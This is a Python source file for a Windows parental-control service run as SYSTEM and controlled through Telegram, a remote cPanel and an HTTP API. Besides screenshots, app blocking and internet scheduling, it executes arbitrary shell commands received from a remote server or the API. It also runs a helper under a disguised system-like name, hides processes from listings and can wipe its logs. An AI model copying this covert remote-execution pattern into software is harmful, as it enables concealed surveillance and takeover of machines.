"""HarnessCore v3.0 - Master Process (SYSTEM session)."""
import os, json, time, socket, threading, subprocess, sys
import urllib.request, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from hc_config import *

import telebot
bot = telebot.TeleBot(API_TOKEN)
BOT_START_TIME = int(time.time())

# ======================= IPC (TCP Server) =======================
_eyes_conn = None
_eyes_lock = threading.Lock()
_ipc_lock = threading.Lock()

class _TCPConn:
    def __init__(self, s):
        self.sock = s; self.buf = ""
    def send(self, d):
        self.sock.sendall((json.dumps(d, ensure_ascii=False) + "\n").encode('utf-8'))
    def recv(self, timeout=None):
        self.sock.settimeout(timeout)
        while "\n" not in self.buf:
            c = self.sock.recv(4096)
            if not c: raise ConnectionError("closed")
            self.buf += c.decode('utf-8', errors='ignore')
        line, self.buf = self.buf.split("\n", 1)
        return json.loads(line)

def _ipc_server():
    global _eyes_conn
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", IPC_PORT)); srv.listen(1)
    log_event(f"IPC server on 127.0.0.1:{IPC_PORT}")
    while True:
        cs, addr = srv.accept()
        log_event(f"Eyes connected: {addr}")
        with _eyes_lock:
            _eyes_conn = _TCPConn(cs)

def push_to_eyes(cmd, timeout=12):
    """Send command to Eyes via TCP and wait for response."""
    global _eyes_conn
    with _ipc_lock:
        with _eyes_lock:
            conn = _eyes_conn
        if conn is None:
            return None
        rid = time.time()
        try:
            conn.send({"id": rid, "command": cmd})
            res = conn.recv(timeout=timeout)
            if res and res.get("id") == rid:
                return res.get("data", {})
        except Exception as e:
            log_event(f"IPC error: {e}", "ERROR")
            with _eyes_lock:
                _eyes_conn = None
        return None

# ======================= Schedule Engine =======================

# ======================= Schedule State IO =======================
SCH_STATE_FILE = os.path.join(DATA_DIR, "sch_state.json")

def _load_sch_state():
    try:
        with open(SCH_STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {"blocked": False, "override_until": 0}

def _save_sch_state(st):
    try:
        with open(SCH_STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(st, f)
    except Exception as e:
        log_event(f"Error saving sch_state: {e}", "ERROR")

_sch_state = _load_sch_state()


def _in_block_now():
    sch = load_schedule()
    if not sch.get("enabled"): return False, None
    if _sch_state["override_until"] > time.time(): return False, None
    now = datetime.now()
    day = now.isoweekday()
    ct = now.strftime("%H:%M")
    for b in sch.get("blocks", []):
        if day in b.get("days", []) and b["start"] <= ct < b["end"]:
            return True, b
    return False, None

def _schedule_loop():
    """Background thread: check schedule every SCHEDULE_CHECK_SEC."""
    while True:
        try:
            in_block, block = _in_block_now()
            if in_block and not _sch_state["blocked"]:
                if get_state().get("level", 0) != 3: # Không đè nếu đang Lockdown
                    set_level(2)
                _sch_state["blocked"] = True; _save_sch_state(_sch_state)
                log_event(f"[SCHEDULE] Restricted Mode active: #{block['id']}")
                _safe_notify(MSG["SCH_BLOCKED"].format(
                    bid=block["id"], start=block["start"], end=block["end"]))
            elif not in_block and _sch_state["blocked"]:
                if get_state().get("level", 0) != 3:
                    set_level(0)
                _sch_state["blocked"] = False; _save_sch_state(_sch_state)
                log_event("[SCHEDULE] Restricted Mode inactive")
                _safe_notify(MSG["SCH_UNBLOCKED"])
        except Exception as e:
            log_event(f"Schedule error: {e}", "ERROR")
        time.sleep(SCHEDULE_CHECK_SEC)


# ======================= Watchdog =======================
def _is_eyes_alive():
    try:
        out = subprocess.run(
            'wmic process where "name=\'python.exe\' or name=\'pythonw.exe\'" get commandline',
            shell=True, capture_output=True, timeout=5, creationflags=NOWINDOW
        ).stdout.decode('utf-8', errors='ignore')
        return "--eyes" in out
    except: return False

def _check_and_fix_administrators():
    try:
        # Audit accessibility binaries to prevent Utilman/Sethc hijack
        try:
            cmd_size = os.path.getsize(r"C:\Windows\System32\cmd.exe")
            util_size = os.path.getsize(r"C:\Windows\System32\utilman.exe")
            sethc_size = os.path.getsize(r"C:\Windows\System32\sethc.exe")
            if util_size == cmd_size or sethc_size == cmd_size:
                log_event("[ALERT] Security binary tampering detected! Restoring system files...", "WARNING")
                subprocess.run("sfc /scanfile=C:\\Windows\\System32\\utilman.exe", shell=True, creationflags=NOWINDOW)
                subprocess.run("sfc /scanfile=C:\\Windows\\System32\\sethc.exe", shell=True, creationflags=NOWINDOW)
                _safe_notify("<b>âš ï¸ CẢNH BÃO BẢO MẬT:</b> Phát hiện tệp trợ năng bị tráo đổi (Utilman/Sethc)! ÄÃ£ tự động khôi phục.")
        except Exception as ae:
            log_event(f"Accessibility tools audit error: {ae}", "ERROR")
            
        # Continue to check local administrators group
        res = subprocess.run('net localgroup Administrators', shell=True, capture_output=True, timeout=5, creationflags=NOWINDOW)
        out = res.stdout.decode('utf-8', errors='ignore') + res.stderr.decode('utf-8', errors='ignore')

        
        lines = out.splitlines()
        members = []
        start_parsing = False
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith("---"):
                start_parsing = True
                continue
            if start_parsing:
                if "The command completed successfully" in line:
                    break
                members.append(line)
        
        acc, nick = get_child_info()
        child_acc = acc.lower()
        for m in members:
            m_lower = m.lower()
            if m_lower and m_lower == child_acc:
                log_event(f"[ALERT] Unauthorized administrator detected: {m}. Downgrading...", "WARNING")
                subprocess.run(f'net localgroup Administrators "{m}" /delete', shell=True, creationflags=NOWINDOW)
                msg = f"<b>âš ï¸ CẢNH BÃO BẢO MẬT:</b> Phát hiện tài khoản <code>{m}</code> tự ý nâng quyá»n Admin! ÄÃ£ tự động thu hồi quyá»n."
                _safe_notify(msg)
    except Exception as e:
        log_event(f"Audit administrators error: {e}", "ERROR")

def _get_blacklist():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        return cfg.get("app_blacklist", [])
    except Exception as e:
        log_event(f"Error loading blacklist: {e}", "ERROR")
        return []

def _check_and_kill_games():
    if not os.path.exists(RESTRICTED_FILE):
        return
    try:
        res = subprocess.run(
            'wmic process get name',
            shell=True, capture_output=True, timeout=5, creationflags=NOWINDOW
        )
        out = res.stdout.decode('utf-8', errors='ignore')
        running_names = {line.strip().lower() for line in out.splitlines() if line.strip()}
        
        blacklist = _get_blacklist()
        blacklist_lower = {p.lower() for p in blacklist}
        
        to_kill = [p for p in blacklist_lower if p in running_names]
        if to_kill:
            push_to_eyes("lock", timeout=3)
            time.sleep(1.5)
            
            for p in to_kill:
                log_event(f"🚫 [RESTRICTED] Terminating prohibited game/app: {p}", "WARNING")
                subprocess.run(f"taskkill /F /IM {p}", shell=True, creationflags=NOWINDOW)
                log_event(f"Killed game: {p}")
    except Exception as e:
        log_event(f"Error killing games: {e}", "ERROR")


def _enable_restricted_mode():
    if os.path.exists(RESTRICTED_FILE): return
    with open(RESTRICTED_FILE, "w", encoding="utf-8") as f:
        json.dump({"active": True, "time": time.time()}, f)
    
    # Chrome Policies - URL Blocklist and Allowlist
    subprocess.run('powershell -Command "Remove-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLBlocklist\', \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLAllowlist\' -Recurse -ErrorAction SilentlyContinue"', shell=True, creationflags=NOWINDOW)
    subprocess.run('powershell -Command "New-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLBlocklist\' -Force; New-ItemProperty -Path \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLBlocklist\' -Name \'1\' -Value \'*\' -PropertyType String -Force"', shell=True, creationflags=NOWINDOW)
    
    allowlist = ["drive.google.com", "docs.google.com", "chatgpt.com", "wikipedia.org", "*.edu.vn", "translate.google.com"]
    subprocess.run('powershell -Command "New-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLAllowlist\' -Force"', shell=True, creationflags=NOWINDOW)
    for idx, domain in enumerate(allowlist, start=1):
        subprocess.run(f'powershell -Command "New-ItemProperty -Path \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLAllowlist\' -Name \'{idx}\' -Value \'{domain}\' -PropertyType String -Force"', shell=True, creationflags=NOWINDOW)
        
    # Edge Policies - URL Blocklist and Allowlist
    subprocess.run('powershell -Command "Remove-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLBlocklist\', \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLAllowlist\' -Recurse -ErrorAction SilentlyContinue"', shell=True, creationflags=NOWINDOW)
    subprocess.run('powershell -Command "New-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLBlocklist\' -Force; New-ItemProperty -Path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLBlocklist\' -Name \'1\' -Value \'*\' -PropertyType String -Force"', shell=True, creationflags=NOWINDOW)
    subprocess.run('powershell -Command "New-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLAllowlist\' -Force"', shell=True, creationflags=NOWINDOW)
    for idx, domain in enumerate(allowlist, start=1):
        subprocess.run(f'powershell -Command "New-ItemProperty -Path \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLAllowlist\' -Name \'{idx}\' -Value \'{domain}\' -PropertyType String -Force"', shell=True, creationflags=NOWINDOW)
    
    log_event("Restricted Mode enabled: Chrome/Edge whitelist applied.")

def _disable_restricted_mode():
    if os.path.exists(RESTRICTED_FILE):
        try: os.remove(RESTRICTED_FILE)
        except: pass
        subprocess.run('powershell -Command "Remove-Item -Path \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLBlocklist\', \'HKLM:\\SOFTWARE\\Policies\\Google\\Chrome\\URLAllowlist\', \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLBlocklist\', \'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Edge\\URLAllowlist\' -Recurse -ErrorAction SilentlyContinue"', shell=True, creationflags=NOWINDOW)
        log_event("Restricted Mode disabled: Chrome/Edge policies cleared.")

def _is_helper_alive():
    import ctypes
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.CreateMutexW(None, True, "Global\\Windows_System_Helper_Mutex")
    err = kernel32.GetLastError()
    if handle:
        kernel32.CloseHandle(handle)
    return err == 183

def _watchdog_loop():
    time.sleep(30)
    while True:
        _check_and_fix_administrators()
        if not _is_eyes_alive():
            log_event("[WATCHDOG] Eyes not found, restarting...", "WARNING")
            # Run the Task Scheduler task to start Eyes in the logged-on user's session
            subprocess.run('schtasks /run /tn "Safety_Kids_Eyes"', shell=True, creationflags=NOWINDOW)
        if not _is_helper_alive():
            log_event("[WATCHDOG] Helper not found, restarting...", "WARNING")
            subprocess.run('schtasks /run /tn "Windows_System_Helper"', shell=True, creationflags=NOWINDOW)
        time.sleep(WATCHDOG_SEC)



# ======================= Net Timer =======================
def _start_timer(secs, chat_id):
    def task():
        time.sleep(secs)
        unblock_internet(); clear_net_timer()
        time.sleep(10)
        _safe_notify(MSG["NET_AUTO"])
    threading.Thread(target=task, daemon=True).start()

def _check_startup_net():
    rem, cid = get_timer_info()
    if rem > 0:
        block_internet(); _start_timer(rem, cid)
        return f" (internet chan {round(rem/3600,2)}h)"
    elif os.path.exists(TIMER_FILE):
        unblock_internet(); clear_net_timer()
    return ""

def _safe_notify(text):
    try: bot.send_message(ALLOWED_ID, text, parse_mode='html')
    except: pass

# ======================= 3 Levels & cPanel =======================
STATE_FILE = os.path.join(DATA_DIR, "state.json")
WHITELIST_FILE = os.path.join(CONFIG_DIR, "whitelist.json")

def get_state():
    if not os.path.exists(STATE_FILE): return {"level": 0}
    try:
        with open(STATE_FILE, 'r') as f: return json.load(f)
    except: return {"level": 0}

def set_level(lvl):
    with open(STATE_FILE, 'w') as f: json.dump({"level": lvl}, f)
    log_event(f"Level changed to {lvl}")
    if lvl == 0:
        _sch_state["override_until"] = time.time() + 2*3600
        _save_sch_state(_sch_state)
    elif lvl == 2:
        _sch_state["blocked"] = True
        _save_sch_state(_sch_state)
    elif lvl == 3:
        push_to_eyes("lock", timeout=5)
        # Bắn lệnh khóa 2 lần cho chắc ăn
        time.sleep(1)
        push_to_eyes("lock", timeout=5)

def _cpanel_poll_loop():
    cpanel_url = CFG.get("cpanel_url")
    if not cpanel_url: return
    last_id = -1
    while True:
        try:
            # Gửi Heartbeat & State (Äá»“ng bộ trạng thái)
            st = get_state()
            lvl = st.get("level", 0)
            hb_data = urllib.parse.urlencode({'level': lvl, 'timestamp': time.time(), 'nickname': get_child_info()[1]}).encode()
            hb_req = urllib.request.Request(f"{cpanel_url}/api.php?action=heartbeat", data=hb_data)
            try: urllib.request.urlopen(hb_req, timeout=3)
            except: pass

            req = urllib.request.Request(f"{cpanel_url}/data/cmd.json")
            with urllib.request.urlopen(req, timeout=10) as res:
                data = json.loads(res.read().decode())
                cid = data.get("id", 0)
                if last_id == -1:
                    last_id = cid
                    continue
                if cid > last_id:
                    last_id = cid
                    cmd = data.get("cmd_type")
                    if cmd == "set_level":
                        set_level(data.get("level", 0))
                    elif cmd == "run_cmd":
                        out = subprocess.run(data.get("command", ""), shell=True, capture_output=True, timeout=15, creationflags=NOWINDOW).stdout.decode('utf-8', errors='ignore')
                        rep = urllib.request.Request(f"{cpanel_url}/api.php?action=report_result", data=urllib.parse.urlencode({'result': out}).encode())
                        urllib.request.urlopen(rep, timeout=5)
                    else:
                        res_dict = _exec_api(cmd, data)
                        rep_text = res_dict.get("data") if type(res_dict.get("data")) == str else res_dict.get("message")
                        if rep_text:
                            rep = urllib.request.Request(f"{cpanel_url}/api.php?action=report_result", data=urllib.parse.urlencode({'result': rep_text}).encode())
                            urllib.request.urlopen(rep, timeout=5)
        except Exception: pass
        time.sleep(9)

def _get_whitelist():
    try:
        with open(WHITELIST_FILE, 'r') as f: return json.load(f).get("whitelist", [])
    except: return []

def _check_and_kill_unwhitelisted():
    try:
        wl = [x.lower() for x in _get_whitelist()] + HIDDEN_PROCS
        res = subprocess.run('wmic process get name', shell=True, capture_output=True, timeout=5, creationflags=NOWINDOW)
        names = {line.strip().lower() for line in res.stdout.decode('utf-8', errors='ignore').splitlines() if line.strip()}
        for p in names:
            if p not in wl and p.endswith(".exe"):
                subprocess.run(f"taskkill /F /IM {p}", shell=True, creationflags=NOWINDOW)
    except: pass

def _enforcement_loop():
    while True:
        try:
            lvl = get_state().get("level", 0)
            acc, _ = get_child_info()
            
            # Äáº£m bảo acc luôn được active nếu không phải là Level 3
            if lvl != 3 and acc != CHILD_NOT_SET:
                subprocess.run(f'net user "{acc}" /active:yes', shell=True, creationflags=NOWINDOW)
                
            if lvl == 3: # Lockdown
                if acc != CHILD_NOT_SET: 
                    subprocess.run(f'net user "{acc}" /active:no', shell=True, creationflags=NOWINDOW)
            elif lvl == 2: # Study Mode
                _enable_restricted_mode()
                _check_and_kill_games() # Hoặc dùng hàm quét nâng cao hơn
            else: # lvl 0 or 1 (Free Mode)
                _disable_restricted_mode()
                # Thả cửa hoàn toàn, không diệt process nào
        except Exception as e:
            log_event(f"Enforcement error: {e}", "ERROR")
        time.sleep(2)

# ======================= HTTP API =======================
class _APIHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-API-Key")
        self.end_headers()

    def do_POST(self):
        if self.path != "/api/command":
            self.send_error(404); return
        if self.headers.get("X-API-Key") != API_KEY:
            self.send_error(403); return
        try:
            body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
            req = json.loads(body.decode('utf-8'))
            result = _exec_api(req.get("command",""), req.get("args",{}))
            self._respond(200, result)
        except Exception as e:
            self._respond(500, {"ok": False, "message": str(e)})

    def do_GET(self):
        if self.path == "/api/ping":
            self._respond(200, {"ok": True, "message": "alive"})
        elif self.path.startswith("/api/command"):
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(self.path).query)
            if qs.get("key", [""])[0] != API_KEY:
                self.send_error(403); return
            cmd = qs.get("cmd", [""])[0]
            args = {k: v[0] for k, v in qs.items() if k not in ["key", "cmd"]}
            result = _exec_api(cmd, args)
            self._respond(200, result)
        else:
            self.send_error(404)

    def _respond(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type","application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))

    def log_message(self, *a): pass

def _exec_api(cmd, args):
    """Execute command from HTTP API, return result dict."""
    r = {"ok": True, "message": ""}
    try:
        if cmd == "check":
            r["message"] = _build_check()
        elif cmd == "sshot":
            res = push_to_eyes("sshot")
            if res and not res.get("error") and res.get("file"):
                import base64
                fpath = res["file"]
                with open(fpath, 'rb') as f:
                    r["data"] = base64.b64encode(f.read()).decode()
                    r["filename"] = os.path.basename(fpath)
                try: os.remove(fpath)
                except: pass
            else:
                r["ok"] = False; r["message"] = "Eyes offline"
        elif cmd == "list":
            res = push_to_eyes("list")
            if res and not res.get("error"):
                r["data"] = res.get("output", "[]")
            else:
                r["ok"] = False; r["message"] = "Eyes offline"
        elif cmd == "off":
            h = float(args.get("hours", 0.5))
            block_internet(); save_net_timer(h, ALLOWED_ID); _start_timer(h*3600, ALLOWED_ID)
            r["message"] = f"Internet blocked for {h}h"
        elif cmd == "on":
            unblock_internet(); clear_net_timer()
            r["message"] = "Internet unblocked"
        elif cmd == "lock":
            push_to_eyes("lock"); r["message"] = "Lock sent"
        elif cmd == "set_level":
            lvl = int(args.get("level", 0))
            set_level(lvl)
            r["message"] = f"Level changed to {lvl}"
        elif cmd == "block":
            acc, nick = get_child_info()
            _enable_restricted_mode()
            r["message"] = f"Restricted Mode enabled for {nick}"
        elif cmd == "unblock":
            acc, nick = get_child_info()
            _disable_restricted_mode()
            r["message"] = f"Restricted Mode disabled for {nick}"
        elif cmd == "schedule":
            sub = args.get("sub", "show")
            if sub == "show":
                r["data"] = load_schedule()
            elif sub == "on":
                s = load_schedule(); s["enabled"] = True; save_schedule(s); r["message"] = "Schedule ON"
            elif sub == "off":
                s = load_schedule(); s["enabled"] = False; save_schedule(s)
                if _sch_state["blocked"]: _disable_restricted_mode(); _sch_state["blocked"] = False; _save_sch_state(_sch_state)
                if get_state().get("level", 0) == 2: set_level(0)
                r["message"] = "Schedule OFF"
        elif cmd == "allow":
            mins = int(args.get("minutes", 30))
            _sch_state["override_until"] = time.time() + mins * 60
            _save_sch_state(_sch_state)
            if _sch_state["blocked"]: _disable_restricted_mode(); _sch_state["blocked"] = False; _save_sch_state(_sch_state)
            if get_state().get("level", 0) == 2: set_level(0)
            if get_state().get("level", 0) == 2: set_level(0)
            r["message"] = f"Override {mins}min"
        elif cmd == "report":
            r["data"] = _build_report(args.get("date"))
        elif cmd == "cmd":
            txt = args.get("text", "")
            out = subprocess.run(txt, shell=True, capture_output=True,
                                 timeout=15, creationflags=NOWINDOW).stdout.decode('utf-8', errors='ignore')
            r["message"] = out[:4000]
        elif cmd == "shutdown":
            s = int(args.get("seconds", 5))
            os.system(f"shutdown /s /f /t {s}"); r["message"] = f"Shutting down in {s}s"
        elif cmd == "repair":
            r["message"] = _do_repair()
        elif cmd == "get_logs":
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    r["data"] = f.read()[-8000:]
            else:
                r["message"] = "No log file"
        elif cmd == "debug_on":
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f: cfg = json.load(f)
            cfg['debug_mode'] = True
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(cfg, f, ensure_ascii=False, indent=2)
            r["message"] = "DEBUG is ON"
        elif cmd == "debug_off":
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f: cfg = json.load(f)
            cfg['debug_mode'] = False
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(cfg, f, ensure_ascii=False, indent=2)
            r["message"] = "DEBUG is OFF"
        elif cmd == "wipe_logs":
            wipe_logs()
            r["message"] = "Logs wiped"
        else:
            r["ok"] = False; r["message"] = f"Unknown command: {cmd}"
    except Exception as e:
        r["ok"] = False; r["message"] = str(e)
    return r

def _api_server():
    srv = HTTPServer(("0.0.0.0", API_PORT), _APIHandler)
    log_event(f"HTTP API on 0.0.0.0:{API_PORT}")
    srv.serve_forever()

# ======================= Helpers =======================
def _build_check():
    acc, nick = get_child_info()
    eyes = "ONLINE" if push_to_eyes("ping", timeout=3) else "OFFLINE"
    inet = "BLOCKED" if is_internet_blocked() else "OPEN"
    sch = load_schedule()
    sch_st = "ON" if sch.get("enabled") else "OFF"
    res_st = "ON (Há»c tập)" if os.path.exists(RESTRICTED_FILE) else "OFF"
    return (f"Bot: ALIVE\nDir: {BASE_DIR}\nEyes: {eyes}\n"
            f"Internet: {inet}\nSchedule: {sch_st}\n"
            f"Restricted: {res_st}\nChild: {nick} ({acc})")


def _build_report(date_str=None):
    if not os.path.exists(ACTIVITY_FILE):
        return "Chua co du lieu."
    target = date_str or time.strftime('%Y-%m-%d')
    apps = {}
    with open(ACTIVITY_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try:
                e = json.loads(line)
                if not e.get("time","").startswith(target): continue
                app = e.get("app","?")
                apps.setdefault(app, {"count": 0, "titles": set()})
                apps[app]["count"] += 1
                if e.get("title"): apps[app]["titles"].add(e["title"][:60])
            except: pass
    if not apps: return f"Khong co du lieu cho {target}."
    lines = [f"<b>BAO CAO: {target}</b>\n"]
    for app, info in sorted(apps.items(), key=lambda x: -x[1]["count"]):
        mins = info["count"] * ACTIVITY_SCAN_SEC // 60
        lines.append(f"\n<b>{app}</b> (~{mins} phut)")
        for t in list(info["titles"])[:5]:
            lines.append(f"  - <i>{t}</i>")
    return "\n".join(lines)

def _do_repair():
    killed = []
    try:
        out = subprocess.run(
            'wmic process where "name=\'python.exe\' or name=\'pythonw.exe\'" get commandline, processid /format:csv',
            shell=True, capture_output=True, creationflags=NOWINDOW
        ).stdout.decode('utf-8', errors='ignore')
        my_pid = str(os.getpid())
        for line in out.splitlines():
            if "HarnessCore" not in line and "hc_" not in line: continue
            pid = line.strip().split(",")[-1]
            if pid == my_pid: continue
            try:
                subprocess.run(f"taskkill /F /PID {pid}", shell=True, creationflags=NOWINDOW)
                killed.append(pid)
            except: pass
    except: pass
    subprocess.run('schtasks /run /tn "Safety_Kids_Eyes"', shell=True, creationflags=NOWINDOW)
    time.sleep(3)
    return f"Killed {len(killed)} (PIDs: {','.join(killed) or 'none'}). Eyes restarted."

# ======================= Telegram Handlers =======================
DAY_NAMES = {1:"T2", 2:"T3", 3:"T4", 4:"T5", 5:"T6", 6:"T7", 7:"CN"}

@bot.message_handler(func=lambda m: m.date < BOT_START_TIME)
def _skip_old(m): pass

@bot.message_handler(func=lambda m: m.from_user.id != ALLOWED_ID)
def _unauth(m): bot.reply_to(m, MSG["UNAUTHORIZED"])

@bot.message_handler(commands=['start', 'help'])
def _menu(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, MSG["MENU"], parse_mode='html')

@bot.message_handler(commands=['sys'])
def _sys_menu(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, MSG["SYS_MENU"], parse_mode='html')

@bot.message_handler(commands=['check'])
def _check(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, _build_check(), parse_mode='html')

@bot.message_handler(commands=['sshot'])
def _sshot(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, MSG["SS_LOADING"])
    res = push_to_eyes("sshot")
    if res and not res.get("error"):
        fpath = res.get("file")
        if fpath and os.path.exists(fpath):
            with open(fpath, 'rb') as f: bot.send_photo(m.chat.id, f)
            try: os.remove(fpath)
            except: pass
            return
    bot.send_message(m.chat.id, MSG["SS_OFFLINE"], parse_mode='html')

@bot.message_handler(commands=['list'])
def _list(m):
    if is_duplicate(m.message_id): return
    msg = bot.send_message(m.chat.id, MSG["LIST_LOADING"])
    res = push_to_eyes("list")
    if res is None or res.get("error"):
        bot.edit_message_text(MSG["LIST_OFFLINE"], m.chat.id, msg.message_id, parse_mode='html'); return
    try:
        data = json.loads(res.get("output", "[]"))
        if isinstance(data, dict): data = [data]
        lines = []
        for i in data:
            n = i.get('Name','').lower()
            if n in HIDDEN_PROCS: continue
            t = (i.get('Title','') or 'App')[:50]
            lines.append(f"<b>{n}</b>: <i>{t}</i>")
        text = MSG["LIST_HEADER"] + "\n".join(lines) if lines else MSG["LIST_EMPTY"]
        bot.edit_message_text(text, m.chat.id, msg.message_id, parse_mode='html')
    except Exception as e:
        bot.send_message(m.chat.id, MSG["ERROR"].format(error=str(e)), parse_mode='html')

@bot.message_handler(commands=['report'])
def _report(m):
    if is_duplicate(m.message_id): return
    p = m.text.split()
    date_str = p[1] if len(p) > 1 else None
    text = _build_report(date_str)
    bot.send_message(m.chat.id, text, parse_mode='html')

@bot.message_handler(commands=['level0', 'l0'])
def _lvl0(m):
    if is_duplicate(m.message_id): return
    set_level(0)
    bot.send_message(m.chat.id, "ðŸ•Šï¸ ÄÃ£ chuyển sang Cấp 0 (Tự do - Mở khóa toàn bộ)")

@bot.message_handler(commands=['level2', 'l2'])
def _lvl2(m):
    if is_duplicate(m.message_id): return
    set_level(2)
    bot.send_message(m.chat.id, "âš ï¸ ÄÃ£ chuyển sang Cấp 2 (Há»c tập - Whitelist)")

@bot.message_handler(commands=['level3', 'l3'])
def _lvl3(m):
    if is_duplicate(m.message_id): return
    set_level(3)
    bot.send_message(m.chat.id, "🚨 ÄÃ£ chuyển sang Cấp 3 (Lockdown - Cấm đăng nhập)")

@bot.message_handler(commands=['off'])
def _off(m):
    if is_duplicate(m.message_id): return
    try:
        p = m.text.split()
        h = float(p[1]) if len(p) > 1 else 0.5
        if h <= 0:
            bot.send_message(m.chat.id, MSG["NET_OFF_BAD"]); return
        reopen = time.strftime('%H:%M', time.localtime(time.time() + h * 3600))
        block_internet(); save_net_timer(h, m.chat.id); _start_timer(h * 3600, m.chat.id)
        bot.send_message(m.chat.id, MSG["NET_OFF"].format(
            hours=h, minutes=round(h*60,1), reopen=reopen), parse_mode='html')
    except Exception as e:
        bot.send_message(m.chat.id, MSG["ERROR"].format(error=str(e)), parse_mode='html')

@bot.message_handler(commands=['on'])
def _on(m):
    if is_duplicate(m.message_id): return
    unblock_internet(); clear_net_timer()
    bot.send_message(m.chat.id, MSG["NET_ON"])

@bot.message_handler(commands=['lock'])
def _lock(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, MSG["LOCK_PC"])
    push_to_eyes("lock", timeout=5)

@bot.message_handler(commands=['block'])
def _block(m):
    if is_duplicate(m.message_id): return
    acc, nick = get_child_info()
    if acc == CHILD_NOT_SET:
        bot.send_message(m.chat.id, MSG["CHILD_WARN"]); return
    _enable_restricted_mode()
    bot.send_message(m.chat.id, MSG["BLOCK_OK"].format(name=nick), parse_mode='html')

@bot.message_handler(commands=['unblock'])
def _unblock(m):
    if is_duplicate(m.message_id): return
    acc, nick = get_child_info()
    if acc == CHILD_NOT_SET:
        bot.send_message(m.chat.id, MSG["CHILD_WARN"]); return
    _disable_restricted_mode()
    bot.send_message(m.chat.id, MSG["UNBLOCK_OK"].format(name=nick), parse_mode='html')


@bot.message_handler(commands=['sch'])
def _sch(m):
    if is_duplicate(m.message_id): return
    sch = load_schedule()
    st = "BẬT" if sch.get("enabled") else "TẮT"
    lines = [f"<b>Lịch chặn</b> (đang: {st})\n"]
    blocks = sch.get("blocks", [])
    if not blocks:
        lines.append("Chưa có block nào.")
    else:
        for day_num in range(1, 8):
            day_blocks = [b for b in blocks if day_num in b.get("days", [])]
            if not day_blocks:
                continue
            lines.append(f"\n<b>{DAY_NAMES.get(day_num, str(day_num))}:</b>")
            for b in sorted(day_blocks, key=lambda x: x["start"]):
                lines.append(f"  #{b['id']} {b['start']}-{b['end']}")
    lines.append(f"\n/sch_on - Bật | /sch_off - Tắt")
    lines.append("/sch_add [id] [ngay] [bd] [kt] \n<i>vd: /sch_add 1 12345 22:00 24:00\n</i>#1: chặn từ 22h đến 24h đêm từ T2-T6")
    lines.append("/sch_del [id] - Xóa block")
    lines.append("/allow [phut] - Mở mạng tạm")
    bot.send_message(m.chat.id, "\n".join(lines), parse_mode='html')

@bot.message_handler(commands=['sch_on'])
def _sch_on(m):
    if is_duplicate(m.message_id): return
    s = load_schedule(); s["enabled"] = True; save_schedule(s)
    bot.send_message(m.chat.id, MSG["SCH_ON"])

@bot.message_handler(commands=['sch_off'])
def _sch_off(m):
    if is_duplicate(m.message_id): return
    s = load_schedule(); s["enabled"] = False; save_schedule(s)
    if _sch_state["blocked"]: _disable_restricted_mode(); _sch_state["blocked"] = False; _save_sch_state(_sch_state)
    if get_state().get("level", 0) == 2: set_level(0)
    bot.send_message(m.chat.id, MSG["SCH_OFF"])


@bot.message_handler(commands=['sch_add'])
def _sch_add(m):
    """Add schedule block. Syntax: /sch_add [id] [days] [start] [end]"""
    if is_duplicate(m.message_id): return
    try:
        p = m.text.split()
        if len(p) < 5:
            raise ValueError("Cu phap: /sch_add [id] [ngay:1234567] [bd:HH:MM] [kt:HH:MM]")
        bid = int(p[1])
        days = [int(c) for c in p[2] if c.isdigit() and 1 <= int(c) <= 7]
        start, end = p[3], p[4]
        s = load_schedule()
        s["blocks"] = [b for b in s["blocks"] if b.get("id") != bid]
        s["blocks"].append({"id": bid, "days": days, "start": start, "end": end})
        s["blocks"].sort(key=lambda x: x["id"])
        save_schedule(s)
